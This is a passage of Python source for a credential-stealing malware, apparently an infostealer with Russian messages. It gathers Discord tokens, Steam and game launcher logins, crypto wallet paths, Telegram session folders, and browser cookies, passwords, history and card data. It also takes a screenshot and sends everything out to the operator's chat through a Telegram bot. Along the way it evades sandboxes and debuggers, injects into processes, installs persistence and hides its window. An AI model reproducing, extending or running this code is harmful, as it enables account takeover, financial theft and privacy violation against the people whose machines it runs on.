            os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.wallet'),
            os.path.join(os.environ['APPDATA'], 'AtomicWallet', 'wallets'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Coinomi', 'Coinomi', 'wallets'),
            os.path.join(os.environ['USERPROFILE'], 'Zcash', 'wallet.dat'),
            os.path.join(os.environ['USERPROFILE'], 'Electrum', 'wallets'),
        ]
    elif OS_TYPE == "Linux":
        wallet_paths = [
            os.path.expanduser('~/.exodus'),
            os.path.expanduser('~/.config/atomic'),
            os.path.expanduser('~/.coinomi'),
            os.path.expanduser('~/.zcash/wallet.dat'),
            os.path.expanduser('~/.electrum/wallets'),
        ]
    
    for path in wallet_paths:
        if os.path.exists(path):
            wallets.append(f"Найден: {path}")
    
    return wallets if wallets else ["Кошельки не обнаружены"]

def get_discord_tokens():
    tokens = []
    paths = []
    
    if OS_TYPE == "Windows":
        paths = [
            os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Discord', 'Local Storage', 'leveldb'),
            os.path.join(os.environ['LOCALAPPDATA'], 'DiscordCanary', 'Local Storage', 'leveldb'),
            os.path.join(os.environ['LOCALAPPDATA'], 'DiscordPTB', 'Local Storage', 'leveldb'),
        ]
    elif OS_TYPE == "Linux":
        paths = [
            os.path.expanduser('~/.config/discord/Local Storage/leveldb'),
            os.path.expanduser('~/.config/discordptb/Local Storage/leveldb'),
            os.path.expanduser('~/.config/discordcanary/Local Storage/leveldb'),
        ]
    
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            token_matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                            tokens.extend(token_matches)
                    except:
                        continue
    
    return list(set(tokens)) if tokens else ["Токены Discord не найдены"]

def get_steam_data():
    paths = []
    steam_data = []
    
    if OS_TYPE == "Windows":
        paths = [
            os.path.join(os.environ['PROGRAMFILES(X86)'], 'Steam', 'config', 'loginusers.vdf'),
            os.path.join(os.environ['PROGRAMFILES'], 'Steam', 'config', 'loginusers.vdf'),
        ]
    elif OS_TYPE == "Linux":
        paths = [
            os.path.expanduser('~/.steam/steam/config/loginusers.vdf'),
            os.path.expanduser('~/.var/app/com.valvesoftware.Steam/.steam/steam/config/loginusers.vdf'),
        ]
    
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    usernames = re.findall(r'"AccountName"\s+"(.*?)"', content)
                    steam_data.extend(usernames)
            except:
                steam_data.append(f"Ошибка чтения: {path}")
    
    return steam_data if steam_data else ["Steam аккаунты не найдены"]

def get_telegram_sessions():
    sessions = []
    
    if OS_TYPE == "Windows":
        paths = [
            os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata'),
        ]
        
        users_dir = os.path.join(os.environ['SystemDrive'], 'Users')
        if os.path.exists(users_dir):
            for username in os.listdir(users_dir):
                user_path = os.path.join(users_dir, username)
                if os.path.isdir(user_path) and username not in ['Public', 'Default', 'Default User', 'All Users']:
                    appdata_paths = [
                        os.path.join(user_path, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
                        os.path.join(user_path, 'AppData', 'Local', 'Telegram Desktop', 'tdata'),
                        os.path.join(user_path, 'Application Data', 'Telegram Desktop', 'tdata'),
                    ]
                    paths.extend(appdata_paths)
    
    elif OS_TYPE == "Linux":
        paths = [
            os.path.expanduser("~/.local/share/TelegramDesktop/tdata"),
            os.path.expanduser("~/.TelegramDesktop/tdata"),
            "/opt/telegram/tdata",
            "/var/lib/flatpak/app/org.telegram.desktop/data/TelegramDesktop/tdata"
        ]
        if os.path.exists('/home'):
            for user in os.listdir('/home'):
                user_paths = [
                    os.path.join('/home', user, '.local/share/TelegramDesktop/tdata'),
                    os.path.join('/home', user, '.TelegramDesktop/tdata'),
                ]
                paths.extend(user_paths)
    
    for path in paths:
        if os.path.exists(path) and os.path.isdir(path):
            sessions.append(path)
    
    return sessions if sessions else ["Telegram сессии не найдены"]

def get_game_launchers():
    launchers = []
    
    if OS_TYPE == "Windows":
        # Epic Games Launcher
        epic_path = os.path.join(os.environ['LOCALAPPDATA'], 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
        if os.path.exists(epic_path):
            try:
                game_user_settings = os.path.join(epic_path, 'GameUserSettings.ini')
                if os.path.exists(game_user_settings):
                    config = configparser.ConfigParser()
                    config.read(game_user_settings)
                    if 'RememberMe' in config.sections():
                        username = config.get('RememberMe', 'Username', fallback='Неизвестно')
                        launchers.append(f"Epic Games: {username}")
                    else:
                        launchers.append("Epic Games Launcher: найден (нет данных для входа)")
                else:
                    launchers.append("Epic Games Launcher: найден")
            except Exception as e:
                launchers.append(f"Epic Games Launcher: ошибка чтения - {str(e)}")
        
        # Minecraft
        minecraft_path = os.path.join(os.environ['APPDATA'], '.minecraft')
        if os.path.exists(minecraft_path):
            try:
                launcher_accounts = os.path.join(minecraft_path, 'launcher_accounts.json')
                if os.path.exists(launcher_accounts):
                    with open(launcher_accounts, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        accounts = data.get('accounts', {})
                        for account_id, account_data in accounts.items():
                            username = account_data.get('username', 'Неизвестно')
                            email = account_data.get('email', 'Неизвестно')
                            launchers.append(f"Minecraft: {username} ({email})")
                else:
                    launchers.append("Minecraft: найден (нет данных аккаунтов)")
            except Exception as e:
                launchers.append(f"Minecraft: ошибка чтения - {str(e)}")
        
        # GTA V
        gta_path = os.path.join(os.environ['USERPROFILE'], 'Documents', 'Rockstar Games', 'GTA V')
        if os.path.exists(gta_path):
            try:
                settings_file = os.path.join(gta_path, 'settings.xml')
                if os.path.exists(settings_file):
                    tree = ET.parse(settings_file)
                    root = tree.getroot()
                    for elem in root.iter():
                        if 'username' in elem.tag.lower() or 'email' in elem.tag.lower():
                            if elem.text and elem.text.strip():
                                launchers.append(f"GTA V: {elem.text.strip()}")
                                break
                    else:
                        launchers.append("GTA V: найден (нет данных для входа)")
                else:
                    launchers.append("GTA V: найден")
            except Exception as e:
                launchers.append(f"GTA V: ошибка чтения - {str(e)}")
        
        # Steam
        steam_path = os.path.join(os.environ['PROGRAMFILES(X86)'], 'Steam')
        if os.path.exists(steam_path):
            try:
                login_users = os.path.join(steam_path, 'config', 'loginusers.vdf')
                if os.path.exists(login_users):
                    with open(login_users, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        usernames = re.findall(r'"AccountName"\s+"(.*?)"', content)
                        if usernames:
                            launchers.append(f"Steam: {', '.join(usernames)}")
                        else:
                            launchers.append("Steam: найден (нет данных аккаунтов)")
                else:
                    launchers.append("Steam: найден")
            except Exception as e:
                launchers.append(f"Steam: ошибка чтения - {str(e)}")
        
        # Origin
        origin_path = os.path.join(os.environ['PROGRAMFILES(X86)'], 'Origin')
        if os.path.exists(origin_path):
            try:
                # Проверяем реестр для Origin
                import winreg
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Origin")
                    username, _ = winreg.QueryValueEx(key, "Id")
                    launchers.append(f"Origin: {username}")
                    winreg.CloseKey(key)
                except:
                    launchers.append("Origin: найден (нет данных для входа)")
            except Exception as e:
                launchers.append(f"Origin: ошибка чтения - {str(e)}")
        
        # Ubisoft Connect
        uplay_path = os.path.join(os.environ['PROGRAMFILES(X86)'], 'Ubisoft Game Launcher')
        if os.path.exists(uplay_path):
            try:
                # Проверяем реестр для Ubisoft
                import winreg
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Ubisoft\Launcher")
                    username, _ = winreg.QueryValueEx(key, "Username")
                    launchers.append(f"Ubisoft Connect: {username}")
                    winreg.CloseKey(key)
                except:
                    launchers.append("Ubisoft Connect: найден (нет данных для входа)")
            except Exception as e:
                launchers.append(f"Ubisoft Connect: ошибка чтения - {str(e)}")
            
    elif OS_TYPE == "Linux":
        # Epic Games Launcher для Linux
        epic_path = os.path.expanduser('~/.config/Epic')
        if os.path.exists(epic_path):
            launchers.append("Epic Games Launcher: найден")
        
        # Minecraft для Linux
        minecraft_path = os.path.expanduser('~/.minecraft')
        if os.path.exists(minecraft_path):
            try:
                launcher_accounts = os.path.join(minecraft_path, 'launcher_accounts.json')
                if os.path.exists(launcher_accounts):
                    with open(launcher_accounts, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        accounts = data.get('accounts', {})
                        for account_id, account_data in accounts.items():
                            username = account_data.get('username', 'Неизвестно')
                            email = account_data.get('email', 'Неизвестно')
                            launchers.append(f"Minecraft: {username} ({email})")
                else:
                    launchers.append("Minecraft: найден (нет данных аккаунтов)")
            except Exception as e:
                launchers.append(f"Minecraft: ошибка чтения - {str(e)}")
    
    return launchers if launchers else ["Игровые лаунчеры не найдены"]

def split_large_file(file_path, max_size=45*1024*1024):
    """Разделяет большой файл на части"""
    part_num = 1
    output_files = []
    
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(max_size)
            if not chunk:
                break
                
            part_path = f"{file_path}.part{part_num:03d}"
            with open(part_path, 'wb') as part_file:
                part_file.write(chunk)
                
            output_files.append(part_path)
            part_num += 1
    
    return output_files

def send_report(report):
    try:
        html_report = generate_html_report(report)
        report_path = os.path.join(tempfile.gettempdir(), "report.html")
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(html_report)
        
        txt_report = generate_txt_report(report)
        txt_path = os.path.join(tempfile.gettempdir(), "report.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(txt_report)
        
        screenshot_path = None
        try:
            screenshot_path = os.path.join(tempfile.gettempdir(), "screen.jpg")
            ImageGrab.grab().save(screenshot_path)
        except Exception as e:
            log(f"Ошибка создания скриншота: {str(e)}")
        
        caption = f"📊 Полный отчет о системе\n\n{SIGNATURE}"
        with open(report_path, "rb") as report_file:
            bot.send_document(TG_CHAT_ID, report_file, caption=caption)
        
        caption = f"📄 Текстовый отчет\n\n{SIGNATURE}"
        with open(txt_path, "rb") as txt_file:
            bot.send_document(TG_CHAT_ID, txt_file, caption=caption)
        
        if screenshot_path and os.path.exists(screenshot_path):
            caption = f"🖥️ Скриншот системы\n\n{SIGNATURE}"
            with open(screenshot_path, "rb") as photo:
                bot.send_photo(TG_CHAT_ID, photo, caption=caption)
        
        telegram_sessions = report.get('telegram_sessions', [])
        if telegram_sessions and telegram_sessions[0] != "Telegram сессии не найдены":
            temp_tdata_dir = os.path.join(tempfile.gettempdir(), "tdata_collected")
            os.makedirs(temp_tdata_dir, exist_ok=True)

            for i, session_path in enumerate(telegram_sessions):
                try:
                    session_dir_name = f"session_{i}_{os.path.basename(session_path)}"
                    dest_dir = os.path.join(temp_tdata_dir, session_dir_name)
                    
                    shutil.copytree(session_path, dest_dir, 
                                   ignore=shutil.ignore_patterns('*.tmp', 'temp*', 'cache*', 'emoji', 'user_data', 'dumps', 'tdummy'),
                                   dirs_exist_ok=True)
                    log(f"Скопирована Telegram сессия: {session_path} -> {dest_dir}")
                except Exception as e:
                    log(f"Ошибка копирования Telegram сессии {session_path}: {str(e)}")
                    continue

            zip_path = os.path.join(tempfile.gettempdir(), "tdata.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(temp_tdata_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_tdata_dir)
                        zipf.write(file_path, arcname)

            if os.path.exists(zip_path):
                file_size = os.path.getsize(zip_path) / (1024 * 1024)
                
                if file_size > 45:
                    log(f"Архив слишком большой ({file_size:.2f} MB), разделяем на части...")
                    parts = split_large_file(zip_path)
                    
                    for i, part_path in enumerate(parts):
                        caption = f"📨 Telegram сессии (tdata) - часть {i+1}/{len(parts)}\n\n{SIGNATURE}"
                        with open(part_path, "rb") as part_file:
                            bot.send_document(TG_CHAT_ID, part_file, caption=caption)
                        os.remove(part_path)
                    
                    log(f"Отправлено {len(parts)} частей архива tdata")
                else:
                    caption = f"📨 Telegram сессии (tdata)\n\n{SIGNATURE}"
                    with open(zip_path, "rb") as zip_file:
                        bot.send_document(TG_CHAT_ID, zip_file, caption=caption)
                    log("Telegram сессии успешно отправлены")
                
                try:
                    shutil.rmtree(temp_tdata_dir, ignore_errors=True)
                    os.remove(zip_path)
                except:
                    pass
        
        log("Отчет успешно отправлен")
        
        os.remove(report_path)
        os.remove(txt_path)
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            
    except Exception as e:
        log(f"Ошибка отправки отчета: {str(e)}")
        log(traceback.format_exc())

def main():
    vm_indicators = check_vm_sandbox()
    if vm_indicators:
        log(f"VM/Sandbox detected: {vm_indicators}")
        if len(vm_indicators) > 3:
            log("Too many VM indicators, exiting")
            sys.exit(0)
    
    if EXTRA_FEATURES.get('autostart', True) and OS_TYPE == "Windows":
        if not inject_into_process():
            log("Инжекция не удалась, продолжение в обычном режиме")
    
    if EXTRA_FEATURES.get('autostart', True):
        install_persistence()
    
    report = {
        "system_info": get_system_info(),
        "anti_debug": vm_indicators,
        "browsers": {},
        "discord_tokens": [],
        "steam_data": [],
        "wallets": [],
        "telegram_sessions": [],
        "game_launchers": []
    }
    
    browsers = {
        "Chrome": {
            "cookie_func": browser_cookie3.chrome,
            "profile_paths": [],
            "history_path": "History"
        },
        "Firefox": {
            "cookie_func": browser_cookie3.firefox,
            "profile_paths": [],
            "history_path": "places.sqlite"
        },
        "Edge": {
            "cookie_func": browser_cookie3.edge,
            "profile_paths": [],
            "history_path": "History"
        },
        "Opera": {
            "cookie_func": browser_cookie3.opera,
            "profile_paths": [],
            "history_path": "History"
        },
        "Brave": {
            "cookie_func": browser_cookie3.brave,
            "profile_paths": [],
            "history_path": "History"
        },
        "Vivaldi": {
            "cookie_func": browser_cookie3.vivaldi,
            "profile_paths": [],
            "history_path": "History"
        }
    }
    
    if OS_TYPE == "Windows":
        chrome_base = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
        browsers["Chrome"]["profile_paths"] = [
            os.path.join(chrome_base, "Default"),
            *[p for p in glob(os.path.join(chrome_base, "Profile *")) if os.path.isdir(p)]
        ]
        
        edge_base = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data")
        browsers["Edge"]["profile_paths"] = [
            os.path.join(edge_base, "Default"),
            *[p for p in glob(os.path.join(edge_base, "Profile *")) if os.path.isdir(p)]
        ]
        
        browsers["Firefox"]["profile_paths"] = [
            p for p in glob(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles", "*")) 
            if os.path.isdir(p)
        ]
        
        opera_base = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable')
        if os.path.exists(opera_base):
            browsers["Opera"]["profile_paths"] = [opera_base]
        
        brave_base = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data')
        if os.path.exists(brave_base):
            browsers["Brave"]["profile_paths"] = [os.path.join(brave_base, "Default")] + \
                [os.path.join(brave_base, p) for p in os.listdir(brave_base) if p.startswith("Profile") and os.path.isdir(os.path.join(brave_base, p))]
        
        vivaldi_base = os.path.join(os.environ['LOCALAPPDATA'], 'Vivaldi', 'User Data')
        if os.path.exists(vivaldi_base):
            browsers["Vivaldi"]["profile_paths"] = [os.path.join(vivaldi_base, "Default")] + \
                [os.path.join(vivaldi_base, p) for p in os.listdir(vivaldi_base) if p.startswith("Profile") and os.path.isdir(os.path.join(vivaldi_base, p))]
        
    elif OS_TYPE == "Linux":
        chrome_base = os.path.expanduser("~/.config/google-chrome")
        browsers["Chrome"]["profile_paths"] = [
            os.path.join(chrome_base, "Default"),
            *[p for p in glob(os.path.join(chrome_base, "Profile *")) if os.path.isdir(p)]
        ]
        
        edge_base = os.path.expanduser("~/.config/microsoft-edge")
        browsers["Edge"]["profile_paths"] = [
            os.path.join(edge_base, "Default"),
            *[p for p in glob(os.path.join(edge_base, "Profile *")) if os.path.isdir(p)]
        ]
        
        browsers["Firefox"]["profile_paths"] = [
            p for p in glob(os.path.expanduser("~/.mozilla/firefox/*.default*")) 
            if os.path.isdir(p)
        ]
        
        opera_base = os.path.expanduser('~/.config/opera')
        if os.path.exists(opera_base):
            browsers["Opera"]["profile_paths"] = [opera_base]
        
        brave_base = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser')
        if os.path.exists(brave_base):
            browsers["Brave"]["profile_paths"] = [os.path.join(brave_base, "Default")] + \
                [os.path.join(brave_base, p) for p in os.listdir(brave_base) if p.startswith("Profile") and os.path.isdir(os.path.join(brave_base, p))]
        
        vivaldi_base = os.path.expanduser('~/.config/vivaldi')
        if os.path.exists(vivaldi_base):
            browsers["Vivaldi"]["profile_paths"] = [os.path.join(vivaldi_base, "Default")] + \
                [os.path.join(vivaldi_base, p) for p in os.listdir(vivaldi_base) if p.startswith("Profile") and os.path.isdir(os.path.join(vivaldi_base, p))]
    
    for name, data in browsers.items():
        try:
            if not data["profile_paths"]:
                log(f"Профили {name} не найдены")
                continue
                
            report["browsers"][name] = get_browser_data(
                name,
                data["cookie_func"],
                data["profile_paths"],
                data["history_path"]
            )
            log(f"Данные {name} собраны")
        except Exception as e:
            report["browsers"][name] = {
                "cookies": [f"Ошибка: {str(e)}"],
                "passwords": [f"Ошибка: {str(e)}"],
                "history": [f"Ошибка: {str(e)}"],
                "credit_cards": []
            }
            log(f"Ошибка сбора данных {name}: {str(e)}")
    
    if EXTRA_FEATURES.get('discord', True):
        report['discord_tokens'] = get_discord_tokens()
    
    if EXTRA_FEATURES.get('steam', True):
        report['steam_data'] = get_steam_data()
    
    if EXTRA_FEATURES.get('wallets', True):
        report['wallets'] = get_wallets()
    
    if EXTRA_FEATURES.get('telegram', True):
        report['telegram_sessions'] = get_telegram_sessions()
        
    if EXTRA_FEATURES.get('game_launchers', True):
        report['game_launchers'] = get_game_launchers()
    
    send_report(report)

if __name__ == "__main__":
    try:
        def is_debugger_present():
            try:
                if OS_TYPE == "Windows":
                    return ctypes.windll.kernel32.IsDebuggerPresent() != 0
                else:
                    try:
                        with open(f"/proc/{os.getpid()}/status") as f:
                            status = f.read()
                        return "TracerPid:" in status and "TracerPid: 0" not in status
                    except:
                        return False
            except:
                return False
                
        if is_debugger_present():
            sys.exit(0)
        
        dependencies = [
            "pycryptodome",
            "browser-cookie3",
            "pillow",
            "psutil",
            "pyTelegramBotAPI",
            "pywin32" if OS_TYPE == "Windows" else "secretstorage",
        ]
        
        for dep in dependencies:
            try:
                __import__(dep.split('-')[0])
            except ImportError:
                subprocess.run(f"pip install {dep} --quiet --disable-pip-version-check", shell=True)
        
        import browser_cookie3
        from Crypto.Cipher import AES
        from PIL import ImageGrab
        import telebot
        import psutil
        
        if '--hidden' in OPTIONS:
            if OS_TYPE == "Windows":
                import win32gui
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), 0)
        
        main()
    except Exception as e:
        with open("steler_crash.log", "w") as f:
            f.write(f"Critical error: {str(e)}\n")
            f.write(traceback.format_exc())